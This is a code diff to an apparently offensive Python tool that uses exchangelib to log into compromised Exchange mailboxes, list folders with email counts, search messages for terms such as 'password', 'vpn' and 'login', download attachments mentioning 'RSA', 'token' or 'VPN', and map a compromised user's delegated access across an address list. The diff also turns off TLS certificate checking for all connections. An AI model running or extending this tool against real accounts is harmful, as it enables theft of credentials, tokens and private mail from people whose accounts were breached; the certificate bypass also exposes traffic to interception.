@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
-from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment
+from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
+    NoVerifyHTTPAdapter
 from exchangelib.errors import UnauthorizedError, CASError
 import requests
 import argparse
@@ -8,6 +9,8 @@ import sys
 import logging
 import os
 from os.path import isfile
+
+BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
 
 
 def loggerCreate(params):
@@ -26,9 +29,9 @@ def loggerCreate(params):
 
     return logger
 
+
 # Function to setup an Exchangelib Account object to be used throughout the code
 def acctSetup(params):
-
     server = params.get('server')
     email = params.get('email')
     password = params.get('password')
@@ -40,27 +43,40 @@ def acctSetup(params):
 
         if params.get('delegated'):
             account = Account(primary_smtp_address=shared,
-                            autodiscover=False, config=config, access_type=DELEGATE)
+                              autodiscover=False, config=config, access_type=DELEGATE)
         else:
             account = Account(primary_smtp_address=email,
-                            autodiscover=False, config=config, access_type=DELEGATE)
+                              autodiscover=False, config=config, access_type=DELEGATE)
 
         return account
     except Exception as e:
         print(e)
 
+
 # List folders from a users inbox
 def folderList(accountObject):
-
-    folder = accountObject.root/'Top of Information Store'
+    folder = accountObject.root
+    # 'Top of Information Store'
+    total_folders = 0
+    total_emails = 0
 
     print('[+] Folder List for Compromised Users' + '\n')
-    for folders in folder.walk():
-        print(folders.name)
+    for folder_object in folder.walk():
+        folder_name = folder_object.name
+        folder_abs_path = folder_object.absolute
+        folder_child_folders = folder_object.child_folder_count
+        folder_child_emails = folder_object.total_count
+
+        total_folders += folder_child_folders
+        total_emails += folder_child_emails
+
+        print(f"{'-' * (folder_abs_path.count('/') * 4 - 8)}{folder_name} (folders: {folder_child_folders}, emails: {folder_child_emails})")
+    else:
+        print("\nTotal folders: " + str(total_folders))
+        print("\nTotal emails: " + str(total_emails))
 
 # Search users email for specified terms
 def searchEmail(accountObject, params, loghandle):
-
     folder = params.get("folder")
     terms = params.get("terms")
     count = params.get("count")
@@ -72,7 +88,7 @@ def searchEmail(accountObject, params, loghandle):
     if params.get("delegated"):
         searchFolder = accountObject.inbox
     else:
-        searchFolder = accountObject.root/'Top of Information Store'/folder
+        searchFolder = accountObject.root / 'Top of Information Store' / folder
     if params.get("field") == 'body':
         print(
             '[+] Searching Email body for {} in {} Folder [+]'.format(terms, folder) + '\n')
@@ -90,11 +106,12 @@ From: {}
 Date: {}
 Subject: {}
 Body: {}
-*************************************************************************************************{}'''.format(emails.author.email_address, emails.datetime_received,emails.subject, emails.text_body, '\n'))
+*************************************************************************************************{}'''.format(
+            emails.author.email_address, emails.datetime_received, emails.subject, emails.text_body, '\n'))
+
 
 # Search for attachments based on search terms provided
 def searchAttachments(accountObject, params):
-
     folder = params.get("folder")
     terms = params.get("terms")
     count = params.get("count")
@@ -106,7 +123,7 @@ def searchAttachments(accountObject, params):
     if params.get("delegated"):
         searchFolder = accountObject.inbox
     else:
-        searchFolder = accountObject.root/'Top of Information Store'/folder
+        searchFolder = accountObject.root / 'Top of Information Store' / folder
     if params.get("field") == 'body':
         for term in termList:
             searchResult = searchFolder.filter(body__contains=term)[:count]
@@ -132,9 +149,9 @@ def searchAttachments(accountObject, params):
                             buffer = fp.read(1024)
     print('\n' + 'Saved attachment to', params.get("directory"))
 
+
 # Check where compromised user has delegation rights
 def searchDelegates(params, fparser):
-
     server = params.get('server')
     email = params.get('email')
     password = params.get('password')
@@ -153,36 +170,38 @@ def searchDelegates(params, fparser):
                 server=server, credentials=Credentials(email, password))
 
             account = Account(primary_smtp_address=shared,
-                          autodiscover=False, config=config, access_type=DELEGATE)
+                              autodiscover=False, config=config, access_type=DELEGATE)
 
             folderInbox = account.inbox
-            #print(folderInbox.permission_set)
+            # print(folderInbox.permission_set)
             for s in folderInbox.permission_set.permissions:
                 if s.permission_level != 'None':
-                    print('User: {} has {} permissions on {}\'s Inbox'.format(email,s.permission_level,shared))
+                    print('User: {} has {} permissions on {}\'s Inbox'.format(email, s.permission_level, shared))
 
         except Exception as e:
-            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(e):
+            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(
+                    e):
                 print(e)
 
-# This is where we check if the address list file provided exists           
+
+# This is where we check if the address list file provided exists
 def file_parser(params):
-	return_dict = {}
+    return_dict = {}
 
-	if isfile(params.get("galList")):
-		with open (params.get("galList","r")) as f:
-			userfile_content = f.read().splitlines()
-			f.close()
-			return_dict['galList'] = userfile_content
-	elif isinstance(params.get("galList"), str):
-		return_dict['galList'] = params.get("galList")
-	else:
-		print ("GAL File not found!")
+    if isfile(params.get("galList")):
+        with open(params.get("galList", "r")) as f:
+            userfile_content = f.read().splitlines()
+            f.close()
+            return_dict['galList'] = userfile_content
+    elif isinstance(params.get("galList"), str):
+        return_dict['galList'] = params.get("galList")
+    else:
+        print("GAL File not found!")
 
-	return return_dict
+    return return_dict
+
 
 def print_logo():
-
     logo = '''
   _____       __  __       _ _  _____       _                 
  |  __ \     |  \/  |     (_) |/ ____|     (_)                
@@ -227,34 +246,36 @@ if __name__ == "__main__":
     attach_parser.add_argument('-d', '--directory', action="store",
                                dest="directory", help='Directory to download attachments', metavar=' ')
     attach_parser.add_argument('-t', '--terms', action="store",
-                               dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)', nargs='+', type=str, default='RSA,token,VPN')
+                               dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
+                               nargs='+', type=str, default='RSA,token,VPN')
     attach_parser.add_argument('-f', '--folder', action="store",
                                dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
     attach_parser.add_argument('-c', '--count', action="store",
                                dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
     attach_parser.add_argument('--field', action="store",
-                               dest="field", help='Email field to search. Default is subject', choices=['subject', 'body'])
+                               dest="field", help='Email field to search. Default is subject',
+                               choices=['subject', 'body'])
 
     delegate_parser = subparsers.add_parser(
         'delegation', help="Find where compromised user has access", parents=[optional_parser])
     delegate_parser.add_argument('-g', '--gal', action="store",
-                              dest="galList", metavar=' ', help='List of email addresses to check access', required=True)
+                                 dest="galList", metavar=' ', help='List of email addresses to check access',
+                                 required=True)
 
-    email_parser = subparsers.add_parser(
-        'emails', help="Search for Emails", parents=[optional_parser])
-    email_parser.add_argument('-f', '--folder', action="store",
-                              dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
+    email_parser = subparsers.add_parser('emails', help="Search for Emails", parents=[optional_parser])
+    email_parser.add_argument('-f', '--folder', action="store", dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
     email_parser.add_argument('-t', '--terms', action="store",
-                              dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)', nargs='+', type=str, default='password,vpn,login')
+                              dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
+                              nargs='+', type=str, default='password,vpn,login')
     email_parser.add_argument('-c', '--count', action="store",
                               dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
     email_parser.add_argument('--field', action="store",
-                              dest="field", help='Email field to search. Default is subject', choices=['subject', 'body'])
+                              dest="field", help='Email field to search. Default is subject',
+                              choices=['subject', 'body'])
     email_parser.add_argument('--delegated', action="store",
                               dest="delegated", help='Mailbox with access')
     email_parser.add_argument('-o', '--output', action="store",
                               dest="output", metavar=' ', help='Filename to save emails', required=True)
-
 
     args = parser.parse_args()
     if len(sys.argv) == 1:
@@ -272,7 +293,7 @@ if __name__ == "__main__":
     if accountObj is None:
         print('[+] Could not connect to MailBox [+]')
         sys.exit()
-        
+
     if parsed_arguments['modules'] == 'folders':
         folderList(accountObj)
     elif parsed_arguments['modules'] == 'emails':
@@ -280,4 +301,4 @@ if __name__ == "__main__":
     elif parsed_arguments['modules'] == 'attachment':
         searchAttachments(accountObj, parsed_arguments)
     elif parsed_arguments['modules'] == 'delegation':
-        searchDelegates(parsed_arguments,fileparser)
+        searchDelegates(parsed_arguments, fileparser)
